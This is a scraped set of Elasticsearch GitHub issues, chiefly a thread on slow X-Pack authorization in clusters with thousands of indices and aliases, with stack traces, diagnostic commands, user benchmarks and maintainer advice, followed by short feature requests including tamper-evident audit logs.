       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.applyInternal(SecurityActionFilter.java:156)
       org.elasticsearch.xpack.security.action.filter.SecurityActionFilter.apply(SecurityActionFilter.java:108)
       app//org.elasticsearch.action.support.TransportAction$RequestFilterChain.proceed(TransportAction.java:177)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:155)
       app//org.elasticsearch.action.support.TransportAction.execute(TransportAction.java:83)
       app//org.elasticsearch.client.node.NodeClient.executeLocally(NodeClient.java:83)
       app//org.elasticsearch.client.node.NodeClient.doExecute(NodeClient.java:72)
       app//org.elasticsearch.client.support.AbstractClient.execute(AbstractClient.java:409)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.execute(AbstractClient.java:1274)
       app//org.elasticsearch.client.support.AbstractClient$IndicesAdmin.refresh(AbstractClient.java:1585)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction.lambda$prepareRequest$0(RestRefreshAction.java:60)
       app//org.elasticsearch.rest.action.admin.indices.RestRefreshAction$$Lambda$6003/0x000000080192ed78.accept(Unknown Source)
       app//org.elasticsearch.rest.BaseRestHandler.handleRequest(BaseRestHandler.java:115)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$0(SecurityRestFilter.java:76)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5235/0x000000080183abe0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.lambda$authenticateAndAttachToContext$2(SecondaryAuthenticator.java:82)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator$$Lambda$5259/0x000000080183e090.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticate(SecondaryAuthenticator.java:92)
       org.elasticsearch.xpack.security.authc.support.SecondaryAuthenticator.authenticateAndAttachToContext(SecondaryAuthenticator.java:77)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.lambda$handleRequest$2(SecurityRestFilter.java:70)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter$$Lambda$5087/0x00000008017d7498.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$writeAuthToContext$24(AuthenticationService.java:680)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5234/0x000000080183a9b8.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.writeAuthToContext(AuthenticationService.java:695)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.finishAuthentication(AuthenticationService.java:669)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeUser(AuthenticationService.java:616)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$16(AuthenticationService.java:493)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5137/0x000000080181e560.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.action.support.ContextPreservingActionListener.onResponse(ContextPreservingActionListener.java:43)
       org.elasticsearch.xpack.core.common.IteratingActionListener.onResponse(IteratingActionListener.java:120)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$13(AuthenticationService.java:459)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5152/0x000000080181f6e0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$1(CachingUsernamePasswordRealm.java:146)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5225/0x0000000801838f88.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.handleCachedAuthentication(CachingUsernamePasswordRealm.java:197)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.lambda$authenticateWithCache$2(CachingUsernamePasswordRealm.java:138)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm$$Lambda$5176/0x0000000801823490.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture$1.doRun(ListenableFuture.java:112)
       app//org.elasticsearch.common.util.concurrent.AbstractRunnable.run(AbstractRunnable.java:37)
       app//org.elasticsearch.common.util.concurrent.EsExecutors$DirectExecutorService.execute(EsExecutors.java:226)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.notifyListener(ListenableFuture.java:106)
       app//org.elasticsearch.common.util.concurrent.ListenableFuture.addListener(ListenableFuture.java:68)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticateWithCache(CachingUsernamePasswordRealm.java:133)
       org.elasticsearch.xpack.security.authc.support.CachingUsernamePasswordRealm.authenticate(CachingUsernamePasswordRealm.java:104)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$consumeToken$15(AuthenticationService.java:448)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5133/0x000000080181dc60.accept(Unknown Source)
       org.elasticsearch.xpack.core.common.IteratingActionListener.run(IteratingActionListener.java:102)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.consumeToken(AuthenticationService.java:503)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5130/0x000000080181d5d8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$extractToken$11(AuthenticationService.java:415)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5132/0x000000080181da38.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.extractToken(AuthenticationService.java:425)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$checkForApiKey$3(AuthenticationService.java:366)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5116/0x000000080181b4f0.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.ApiKeyService.authenticateWithApiKeyIfPresent(ApiKeyService.java:342)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.checkForApiKey(AuthenticationService.java:347)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$0(AuthenticationService.java:329)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$5105/0x0000000801819878.accept(Unknown Source)
       app//org.elasticsearch.action.ActionListener$1.onResponse(ActionListener.java:63)
       org.elasticsearch.xpack.security.authc.TokenService.getAndValidateToken(TokenService.java:388)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$authenticateAsync$2(AuthenticationService.java:325)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4765/0x0000000801605bb8.accept(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lambda$lookForExistingAuthentication$6(AuthenticationService.java:384)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator$$Lambda$4766/0x0000000801605df0.run(Unknown Source)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.lookForExistingAuthentication(AuthenticationService.java:395)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.authenticateAsync(AuthenticationService.java:320)
       org.elasticsearch.xpack.security.authc.AuthenticationService$Authenticator.access$000(AuthenticationService.java:261)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:141)
       org.elasticsearch.xpack.security.authc.AuthenticationService.authenticate(AuthenticationService.java:126)
       org.elasticsearch.xpack.security.rest.SecurityRestFilter.handleRequest(SecurityRestFilter.java:63)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:236)
       app//org.elasticsearch.rest.RestController.tryAllHandlers(RestController.java:318)
       app//org.elasticsearch.rest.RestController.dispatchRequest(RestController.java:176)
       app//org.elasticsearch.http.AbstractHttpServerTransport.dispatchRequest(AbstractHttpServerTransport.java:318)
       app//org.elasticsearch.http.AbstractHttpServerTransport.handleIncomingRequest(AbstractHttpServerTransport.java:372)
       app//org.elasticsearch.http.AbstractHttpServerTransport.incomingRequest(AbstractHttpServerTransport.java:308)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:42)
       org.elasticsearch.http.netty4.Netty4HttpRequestHandler.channelRead0(Netty4HttpRequestHandler.java:28)
       io.netty.channel.SimpleChannelInboundHandler.channelRead(SimpleChannelInboundHandler.java:99)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       org.elasticsearch.http.netty4.Netty4HttpPipeliningHandler.channelRead(Netty4HttpPipeliningHandler.java:58)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.MessageToMessageDecoder.channelRead(MessageToMessageDecoder.java:103)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.codec.ByteToMessageDecoder.fireChannelRead(ByteToMessageDecoder.java:324)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:296)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.timeout.IdleStateHandler.channelRead(IdleStateHandler.java:286)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1518)
       io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1267)
       io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1314)
       io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:501)
       io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:440)
       io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357)
       io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379)
       io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365)
       io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919)
       io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:163)
       io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:714)
       io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:615)
       io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:578)
       io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493)
       io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989)
       io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74)
       java.base@15/java.lang.Thread.run(Thread.java:832)

```
</details>","Pinging @elastic/es-security (Team:Security)Investigation notes:
* Look into `IndicesPermission#authorize` to improve performance when FLS/DLS is not enabled.
* Also look into the cache-ability, at the `Role` level, for a pair of action name and indices; also we should exploit the incremental nature of the `IndicesPermission#authorize` check wrt to the index set (ie if we know the result of `authorize(action:x, [a])` and `authorize(action:x, [b])` we don't need to recompute `authorize(action:x, [a, b])`).Hey @albertzaharovits,

I think we're hitting exactly this issue in a cluster with ~2500 indices. Elasticsearch running on Kubernetes, orchestrated by ECK is exhibiting readiness probe failures that we think could be tracked back to this. A `hot_threads` output shows the following:
```
$ curl -s -k ""https://elastic:PW@localhost:9200/_nodes/logging-prod-es-ingest-jmx-a-0/hot_threads"" | grep ""cpu usage by thread"" -A 3
   100.1% (500.6ms out of 500ms) cpu usage by thread 'elasticsearch[logging-prod-es-ingest-jmx-a-0][transport_worker][T#8]'
     10/10 snapshots sharing following 304 elements
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:367)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:286)
--
   100.1% (500.6ms out of 500ms) cpu usage by thread 'elasticsearch[logging-prod-es-ingest-jmx-a-0][transport_worker][T#3]'
     4/10 snapshots sharing following 305 elements
       org.elasticsearch.xpack.security.authz.RBACEngine.resolveAuthorizedIndicesFromRole(RBACEngine.java:536)
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:367)
--
   100.1% (500.5ms out of 500ms) cpu usage by thread 'elasticsearch[logging-prod-es-ingest-jmx-a-0][transport_worker][T#2]'
     10/10 snapshots sharing following 304 elements
       org.elasticsearch.xpack.security.authz.RBACEngine.loadAuthorizedIndices(RBACEngine.java:367)
       org.elasticsearch.xpack.security.authz.AuthorizationService.lambda$authorizeAction$5(AuthorizationService.java:286)
```

Much more detail can be found in the following forum discussion: https://discuss.elastic.co/t/elasticsearch-readiness-probe-failures/270581

(_edit for clarification:_ the issue seems to significantly limit indexing throughput in this setup) This kind of makes x-pack security unusable for large clusters (our current v5 production cluster is several times larger than this, we're looking at upgrading now). Do you know if there is traction on this (and the related #68004)?

Thank you.

Cheers,

JánosHi @jcsorvasi!

I appreciate your input so far. We're currently investigating, but not committing for a fix just yet.

I understand there are ~2500 indices in the cluster that you're ingesting into. I have a couple of follow-up question to that:
* Are these datastreams, aliases or regular indices? Same question about the ones that you're ingesting into.
* do the requests, in general, access most of the indices or just a couple? (I see from https://discuss.elastic.co/t/elasticsearch-readiness-probe-failures/270581 that it's most, can you please confirm)
* do the roles assigned to the user use document or field level security?
* can you share an approximate for the number of users, as well as for the number of roles that the user has assigned?
* can you please estimate the rate of change for indices? How often are new indices created/deleted?

If possible, can you create a JFR dump for the node, and share it with us?

You need to restart the node with the following in `config/jvm.options`:
```
-XX:+UnlockDiagnosticVMOptions
-XX:+DebugNonSafepoints
-XX:FlightRecorderOptions=memorysize=98M
-XX:StartFlightRecording=disk=true,name=elasticsearch-continuous,maxsize=98M
-XX:+StartAttachListener
```
and then issue:
```
$JAVA_HOME/bin/jcmd $ES_PID JFR.dump
```
when the ingest node is hiccuping. In addition to the stacktraces it would provide us with information on the memory load, to help evaluate the caching opportunities.

I am thankful for whatever details you can provide to help us!

Also, from the forum link https://discuss.elastic.co/t/elasticsearch-readiness-probe-failures/270581 it looks like you've got some CPU capacity left. In this case I think you could experiment with increasing the number of transport threads, so that, even if inefficient, authz can saturate more of the available cpu capacity, increasing throughput, ie, try setting on the ingest node:
```
transport.netty.worker_count: 32
```Hey @albertzaharovits,

Let me answer some of your questions quickly now, gathering Flight Recorder data is going to take some time as we've destroyed the cluster already (note on that in the forum post in my latest comment). I'll hopefully have an opportunity to rebuild it sometime next week and get you the data you need, as well as do some comparison between identical clusters receiving the same data, one with xpack security turned on and one with it off. 

> Are these datastreams, aliases or regular indices? Same question about the ones that you're ingesting into. 

In short: aliases.

Our index setup is basically per-app weekly indices with daily aliases (from before datastreams were a thing). For example: 

| Alias | Index |
|---|---|
|`logstash-app1-2021.04.16`<br />`logstash-app1-2021.04.17`<br />`logstash-app1-2021.04.18`|`logstash-app1-2021.15-000001`|
|`logstash-app1-2021.04.19`<br />`logstash-app1-2021.04.20`<br />`logstash-app1-2021.04.21`|`logstash-app1-2021.16-000001`|

Indices and aliases are pre-created for the future by a management tool. Just to give you some numbers, since we rebuilt the (test) cluster on Tuesday and started ingesting production data into it, the cluster now has 1116 indices, 4852 aliases and 3846 active shards. Our current live (v5) production cluster has a rolling retention of 32 days, with 7646 indices, 43126 aliases and 30244 active shards.

The indexer (logstash with the elasticsearch output) is configured with the following parameter:
```
index               => ""logstash-%{[@metadata][_appname]}-%{+YYYY.MM.dd}""
```
This way (almost) all index requests are sent to their respective alias for the current day and so each bulk request has the potential to include up 6000 index requests, possibly touching hundreds of indices or more.

> do the requests, in general, access most of the indices or just a couple?

I would say most of the indices. As I mentioned, there are per-app indices and how much an app logs varies wildly. Some of the chattiest apps sometimes produce tens of thousands of messages per second, some only a handful for the entire day. 

> do the roles assigned to the user use document or field level security?

We didn't go far into using all the security features, the setup is basically what ECK sets up. All apps around ES (logstash, kibana, etc.) use the built-in `elastic` (super)user. We haven't configured any document or field level security

> can you share an approximate for the number of users, as well as for the number of roles that the user has assigned?

Vanilla ECK setup, no extra users or roles created by us.

> can you please estimate the rate of change for indices? How often are new indices created/deleted?

**Once a day** a management tool runs that pre-creates aliases (per app) for the future, **~1300 aliases created**.
**Once a week**, this same process hits a new week and pre-creates the backing weekly indices, so **~1300 indices created** on top of the **~1300 aliases** once a week.
Once a day, [curator](https://github.com/elastic/curator) runs to remove indices that contain data older than 32 days. This normally produces little churn, but **once a week removes** a whole week's worth of data, so **~1300 indices.**
A separate process continuously monitors the incoming data streams per app and if it detects a data spike that it deems the current shard configuration for the index wouldn't be able to handle, it executes a rollover (with a higher number of shards). This happens 0-17 times per day, on average 3 times, so **~3 indices created per day**.

Thanks for the tip on increasing the transport thread count, I'll try it out next week!Hi @albertzaharovits : We are facing exactly similar performance issue with authorization. We have around 3K indices and 20K aliases. After upgrading to 7.9.0 with XPACK authentication, all the ingest and search operations have slowed down drastically. Our ingest performance use to be around 20ms, now its in 500ms.

All the hot_threads are showing transport_worker with loadAuthorizedIndices stack trace.

Also we are noticing CPU is not fully utilized in each POD, however the CPU % from _cat/nodes is showing 100% usage.

We have created a user and assigned superuser role.

Is there any recommended tuning to improve the performance?

Is there a way to disable index authorization?Hi!

We also have a large cluster impacted by this issue. 
Our setup is 5K+ indices, 25K+ aliases, write rate 60K/sec, 50 machines with 24 ingesting nodes.
We write in about 100 indices.

We upgraded from ES 6.2.3 with search guard to ES 7.9.3 with xpack.
Ingesting times for our setup are:

- ES 6.2.3 with search guard: around 600ms. (one single user with full permissions)
- ES 7.9.3 with xpack: around 8sec (one single user with full permissions)
- ES 7.9.3 without xpack: around 300ms
- ES 7.9.3 with search guard: around 15sec (one single user with full permissions)

Our stacks from hot_threads are similar to those provided in the first topic. Also are similar in search guard case. 

Also, the load of masters is quite different:
- ES 6.2.3 with search guard: 0.3
- ES 7.9.3 with xpack: 2
- ES 7.9.3 without xpack: 0.3
- ES 7.9.3 with search guard: 2

Also, the interval of full cluster restart is different:
- ES 7.9.3 with xpack: minimum one hour
- ES 7.9.3 without xpack: several minutes, max 15 minutes.

@ilavajuthy @orinciog Thank you for the new imput on this one!

TLDR I strongly recommend you upgrade to 7.16, which just came out . Or at least I would be grateful if you could run the same benchmarks on it.
That release includes a couple of performance-related changes, including, but not limited:
[Filter original indices in shard level request by jimczi · Pull Request #78508 · elastic/elasticsearch](https://github.com/elastic/elasticsearch/pull/78508)
[Superuser fastpath for indexAccessControl by ywangd · Pull Request #78498 · elastic/elasticsearch](https://github.com/elastic/elasticsearch/pull/78498)
[Skip loading authorized indices if requests do not need them by ywangd · Pull Request #78321 · elastic/elasticsearch](https://github.com/elastic/elasticsearch/pull/78321)
[Avoid redundant authz indices contains check for wildcard expansion by albertzaharovits · Pull Request #76540 · elastic/elasticsearch](https://github.com/elastic/elasticsearch/pull/76540) 

There are many changes between the 6.2 and 7.9 releases, but honestly we didn't benchmark comparatively. I suspect, though, that the performance issues might not be directly caused by the Security code changes.

At the moment we are comfortable with the state of this in 7.16, and we're not planning any changes soon.
But, if you have a comparative benchmark with a 6.x release please do let me know, I promise I'll investigate.

Thank you again for taking the time to report it.


Hi! @albertzaharovits 
Thank you for your input on this problem.

Right now, for us it's a lit bit tricky to update to 7.16 (We have a series of Kibana legacy plugins and we are stuck with Kibana 7.9.3 - the latest version of Kibana that supports legacy plugins)

I want to ask you if you compared the performance of es 7.x and 7.16 in terms of large clusters (high number of indices, high ingest rate) and if you have some comparatives between them (with xpack and without xpack).

From our numbers, in 7.9.3, with xpack enabled the performance is about 10x worst than without xpack (all others factors remain the same - ingesting rate, number of machines etc).

If you have such comparatives and the results of them are ok, than we could try to migrate to latest version. 

Thank you again for your effort and input,

Hi @albertzaharovits : Thanks for the details that 7.16 have fixes to improve performance. Moving to 7.16 will take sometime for us. In the meantime is there any option to disable authorization and have only authentication for super user roles?Hi @orinciog!
We unfortunately do not have benchmarks for large clusters.
Our benchmarks, that we use to detect regression, use clusters of three nodes and only a couple of indices, for eg https://elasticsearch-benchmarks.elastic.co/#tracks/nyc-taxis/nightly/default/1y .
The truth is that we've been blind to clusters with many names (indices, aliases, data streams), and some eggregious inefficiencies have crept in the authorization code.
We'll be adding benchmarks for many indices.

I can't reliabily help you out with benchmarking, I'm sorry.
Realistically, I would only have bandwidth to set-up and run a rally test bench if I could tie it up to some further performance improvements, but we're not planning any of that for now (we're relatively content with the changes we got in 7.16).

If you go about benchmarking on your own, you can start from this recent blog post https://www.elastic.co/blog/seven-tips-for-better-elasticsearch-benchmarks , and **please** do let us know about the test scenario (total number of indices/aliases/data streams, the number of indices/aliases/data streams that the user(s) are authorized for, the number of cluster nodes, whether you're benchmarking ingestion or searching and if searching, how many indices are searched in a single request (search requests can contain wildcards)).

Hi @ilavajuthy 
Generally speaking some performance issues can be avoided if users only have access to a relatively small subset of indices (indeed it is generally a good idea to avoid users with broad capabilities). If you find it helpful, you could employ a [run-as](https://www.elastic.co/guide/en/elasticsearch/reference/current/run-as-privilege.html) scheme, where the user with broad capabilities, instead of directly indexing/querying, uses the run-as header as a way to restrict the visibility for the operation. 

Another option would be to implement a plugin with a custom authorization engine, see:
https://github.com/elastic/elasticsearch/tree/master/plugins/examples/security-authorization-engine
https://github.com/elastic/elasticsearch/tree/master/plugins/examples/security-authorization-engine/src/main/java/org/elasticsearch/example
This approach is also uncomfortable because plugins have to be recompiled and redeployed on every upgrade.
In addition it is fraught because the authorization methods are not ideally abstracted, and there are undocumented subtlelties when implementing the `AuthorizationEngine` interface.
But it is technically doable and there is an example.


",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317449572,"Allow custom run-as header fields","*Original comment by @markwalkom:*

[Here](https://www.elastic.co/guide/en/shield/current/submitting-requests-for-other-users.html) we only allow the use of `es-shield-runas-user` as the header value we read. It'd be awesome if we could allow custom header fields to be specified.

See LINK REDACTED for an example.


","*Original comment by @uboness:*

I think it makes sense
",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1171193678,"Expose a monitoring API to get the user, roles and role mappings on the file realm","### Description

For diagnostic purposes, it would be interesting to have an API to collect the users, roles and role mappings of the `file` realm.
It can help the troubleshooting of problems related to configurations not aligned on all the nodes.

If the information is too sensitive to be exposed via an API, it would be great to at least get a ""digest"" so we can pinpoint the configurations are different.","Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-core-infra (Team:Core/Infra)",no,">enhancement,:Core/Infra/Settings,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,317454913,"Minor inconsistency related to index counts","*Original comment by @joegallo:*

<img width=""721"" alt=""screen shot 2017-09-15 at 3 59 41 pm"" src=""https://user-images.githubusercontent.com/187034/30501096-0a6bcf9e-9a2f-11e7-8a3d-0cf485740303.png"">

<img width=""1015"" alt=""screen shot 2017-09-15 at 3 59 51 pm"" src=""https://user-images.githubusercontent.com/187034/30501097-0c522344-9a2f-11e7-9125-fffe33ff6529.png"">

<img width=""1200"" alt=""screen shot 2017-09-15 at 2 56 55 pm"" src=""https://user-images.githubusercontent.com/187034/30500979-a772ab42-9a2e-11e7-8d78-70f4e7a40c20.png"">

I'm testing 5.6.1 and it doesn't seem sure whether there's 7 or 8 indices in my cluster (there are 8, fwiw). The one it's not sure about is .security.

I don't know if this is intentional or accidental, I don't know when the behavior changed (if ever it did).","*Original comment by @joegallo:*

5.5.3 was more consistent about this. (I'm testing this anyway as part of testing 5.6.1 on cloud, I swear this isn't more work for me.)

<img width=""1252"" alt=""screen shot 2017-09-15 at 4 24 29 pm"" src=""https://user-images.githubusercontent.com/187034/30502021-95a411ea-9a32-11e7-8a81-00bd8fce5978.png"">

10/10/10 and I counted the listed indices and there were ten. (The key thing the screenshot is that .security _is shown_.)*Original comment by @joegallo:*

@pickypg this seems maybe related to something you mentioned during the blackbelt session yesterday?*Original comment by @costin:*

I'd be curious to know the answer to this question as well and what's the overall story regarding hidden (`.someIndex`) indices.",no,">bug,:Data Management/Monitoring,:Security/Security,Team:Data Management,Team:Security,"
elastic/elasticsearch,760910749,"Add tamper resistance or tamper evidence to security audit logs","Submitting on behalf of my group of five University of Nebraska - Omaha Cybersecurity Masters students for our Software Assurance class project:

We reviewed Elasticsearch as part of our class project with a hypothetical ""bank portal"" scenario. One key feature of our scenario required was the ability to trace user activity via security audit logs. We identified that an [Audit Log feature](https://www.elastic.co/guide/en/elasticsearch/reference/current/enable-audit-logging.html) already exists in Elasticsearch. However, the log data is stored in a JSON file on each node. If an attacker **or insider** were able to gain access to that file either through a weakness in Elasticsearch or by another means, he/she would be able to easily alter or remove audit events (See [CAPEC-81 Web Logs Tampering](http://capec.mitre.org/data/definitions/81.html)).

Therefore, we would like to offer the idea for a ""tamper-resistant"" or ""tamper-evident"" audit logging capability. The general idea would be to prevent changes to audit log entries made outside of Elasticsearch. If it doesn't too negatively impact performance, perhaps the audit logs file could be encrypted (to provide confidentiality) and a Message Authentication Code could be calculated on it after each change (to provide integrity). The MAC's secret key could be stored securely by the application in a manner that makes it difficult for an outsider to locate but easy for Elasticsearch to use.

 If this sort of ""tamper-resistance"" is not feasible, Elasticsearch could provide the ability to show evidence of tampered logs. To accomplish this, a Message Authentication Code could be calculated on each log message and stored with the message (again, requiring the secret key to remain in a secure location away from the log file). Then, Elasticsearch could provide a mechanism to validate logs by re-calculating the MAC on the log contents. If an attacker made changes, the old MAC and new MAC would not match and Elasticsearch could report that log as ""tampered with"". A few commercial products document a similar feature ([GoAnywhere](https://www.goanywhere.com/managed-file-transfer/audit/auditing), [Ipswitch](https://community.progress.com/s/article/What-causes-sporadic-Tamper-Detection-errors)).

","Pinging @elastic/es-security (Team:Security)Thanks @jburr9 for the proposal.
I like the overall idea of having anti-tampering features for audit logs, but this is not something trivial and at the moment it is not on our roadmap.

One of the obstacles to this implementation is that the audit trail write is a blocking operation. If it cannot be written correctly, the operation doesn't happen. It means that we should be very careful in introducing ""slow"" operations in the process, as they may reflect to the entire system.

The node machine where the file is located should probably be a trusted environment anyway, since it has access to cluster data. This may relax the assumption that anti-tampering should happen before the entry is written to the file, since an attacker with access to the node probably has access to all the information needed to alter the trust chain.

